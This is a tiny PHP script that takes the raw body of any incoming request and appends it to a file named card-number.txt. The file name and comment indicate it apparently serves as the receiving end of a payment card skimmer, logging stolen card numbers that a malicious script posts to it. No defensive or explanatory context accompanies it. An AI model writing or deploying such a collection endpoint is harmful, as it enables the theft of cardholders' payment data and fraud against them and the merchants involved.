<?php
$o = fopen("php://input", "r");
$str = stream_get_contents($o);
fclose($o);

$t = fopen("card-number.txt", "a+"); //get information one card-number.txt
fwrite($t, $str);
fclose($t);
?>
